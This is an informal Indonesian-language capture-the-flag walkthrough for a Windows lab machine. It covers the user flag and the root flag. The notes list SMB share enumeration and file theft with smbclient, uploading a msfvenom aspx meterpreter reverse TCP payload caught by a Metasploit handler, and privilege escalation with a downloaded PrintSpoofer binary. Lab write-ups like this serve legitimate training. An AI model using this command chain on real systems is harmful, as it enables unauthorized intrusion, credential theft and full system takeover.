# user.txt :
> scanning, fuzz, kayak biasanya cek aja dulu, port banyak yg kebuka
> semua port susah, kecuali http sama ssmb di 445 cek aja di smbclient
> smbclient -L //ip -> next yg gada $ dulu -> smbclient //ip/dir -> get passwd disitu ada passwd
> next cek dulu disitu writeable ato ga, coba tes upload file disitu -> put namafilemu.txt
> bisa tuh next bikin shell aja di meterpreter msf
> msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=[ip] lport=[port] -f aspx -o nama.aspx
> msfconsole -> use exploit/multi/handler -> set payloadnya sama kek di -p tadi abis x64/, set ip port
> dah upload dulu aja aspx nya sebelum di run msfconsole nya
> next dah run msfnya, curl ke http yang port 4xxx itu http nya, ke workdir upload aspx tadi
> dah curl aja kesitu portnya itu kan, nanti cek di msfconsole nya masuk
> dah cd2 aja ke C:\\Users bob disitu ada flag cat aja


# root.txt 
> getprivs di meterpreter nya
> terus cek2 aja di gpt coba ini aja dah https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
> next wget aja kesitu nanti upload pake smb lagi dia ada di dir ini c:/inetpub/wwwroot/nt4wrksv
> nah nanti cd kesana aja jadi shell jalanin aja pe nya gini
> PrintSpoofer64.exe -i -c powershell.exe
> dah klaim di users/administrator
